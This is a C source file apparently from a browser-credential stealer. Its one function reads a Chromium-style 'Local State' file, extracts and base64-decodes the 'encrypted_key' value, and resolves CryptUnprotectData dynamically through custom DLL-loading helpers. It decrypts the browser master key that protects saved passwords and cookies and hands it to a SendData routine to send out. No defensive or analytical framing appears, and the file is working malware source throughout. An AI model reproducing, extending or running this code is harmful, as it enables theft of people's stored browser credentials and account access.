#include "../include/decoding.h"
#include "../include/StringUtils.h"
#include "../include/DllOps.h"
#include "../include/AddrResolution.h"
#include "../include/macros.h"
#include "../include/MemoryUtils.h"
#include "../include/FileIO.h"
#include "../include/PathOps.h"
#include "../include/MasterKeyGrabber.h"
#include "../include/SendData.h"

#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>

BOOL (WINAPI *pCryptUnprotectData)(DATA_BLOB*, LPWSTR, DATA_BLOB*, PVOID, CRYPTPROTECT_PROMPTSTRUCT*, DWORD, DATA_BLOB*);

int GrabMasterKey(unsigned short *path) {
    HANDLE              FileHandle           = {0};
    UNICODE_STRING      PathUnicode          = {0};
    OBJECT_ATTRIBUTES   PathObj              = {0};
    IO_STATUS_BLOCK     IOstatus             = {0};
    DATA_BLOB           VaultKey             = {0};
    DATA_BLOB           CryptedVaultKey      = {0};
    void               *Crypt32Dll           = {0};
    char                FileSizeString[20]   = {0};
    unsigned char       DecodedString[500]   = {0};
    unsigned char       Base64String[450]    = {0};
    unsigned char      *FileBuffer           = {0};
    unsigned char      *buffer               = {0};
    unsigned short     *TempPath[250]        = {0};
    int                 FullBufferSize       = 0;
    int                 FileSize             = 0;
    int                 TotalBufferSize      = 0;
    int                 PathSize             = lenW(path);
    int i = 0, j = 0, k = 0;

    MovMemory(path, TempPath, PathSize * 2);
    ConcatStringW(TempPath, L"\\Local State", PathSize);

    InitPathObj(TempPath, &PathObj, &PathUnicode);
    InitFile(&FileHandle, FILE_READ_DATA | SYNCHRONIZE, &PathObj, &IOstatus, FILE_OPEN);

    FileSize = FileSizeG(FileHandle, &IOstatus);
    
    FileBuffer = AllocMemory((SIZE_T)FileSize);
    if (FileBuffer == NULL) {
/*         printf("NULL FILEBUFF\n"); */
        return;
    }

    ReadBuffer(FileHandle, &IOstatus, FileBuffer, FileSize);


    while(FileSize > k) {
        if (FileBuffer[i] == '\"' && FileBuffer[i + 1] == 'e' && FileBuffer[i + 2] == 'n' && FileBuffer[i + 3] == 'c' && FileBuffer[i + 4] == 'r' && FileBuffer[i + 5] == 'y' && FileBuffer[i + 6] == 'p' && FileBuffer[i + 7] == 't' && FileBuffer[i + 8] == 'e' && FileBuffer[i + 9] == 'd' && FileBuffer[i + 10] == '_' && FileBuffer[i + 11] == 'k' && FileBuffer[i + 12] == 'e' && FileBuffer[i + 13] == 'y') {
            i += 17;
            while(TRUE) {
                if (FileBuffer[i] == 0x22) {
                    break;
                }
                Base64String[j] = FileBuffer[i];
                j++;
                i++;
            }
            Base64String[j] = 0x00;
            break;
        }
        i++;
        k++;
    }

    if (Base64String == NULL) {
        return NULL;
    }

    int DecodedLength = DecodeBase64(Base64String, len(Base64String), DecodedString);
    if (DecodedLength == 1) {
        return NULL;
    }

    MovMemory(DecodedString + 5, DecodedString, DecodedLength);
    CryptedVaultKey.cbData = DecodedLength;
    CryptedVaultKey.pbData = DecodedString;

    Crypt32Dll = LoadDll(L"crypt32.dll");
    if (Crypt32Dll == NULL) {
/*         printf("NO DLL\n"); */
        return 1;
    }
    pCryptUnprotectData = GetFuncAddress(Crypt32Dll, CRYPTOUNPROTECTDATA);
    if (pCryptUnprotectData == NULL) {
/*         printf("NO FUNC\n"); */
        return 1;
    }

    if (pCryptUnprotectData(&CryptedVaultKey, NULL, NULL, NULL, NULL, 0, &VaultKey) != 1) {
/*         printf("FUNC FAILED\n"); */
        return 1;
    }

    TotalBufferSize = TotalBufferLength(L"HASH", 32);

    buffer = AllocMemory((SIZE_T)TotalBufferSize);
    if (buffer == NULL) {
/*         printf("NULL BUFF\n"); */
        return 1;
    }

    IntToString(FileSizeString, 32);

    SendData(NULL, "HASH", 32, FileSizeString, buffer, VaultKey.pbData, FALSE);

    FreeMemory(FileBuffer);
}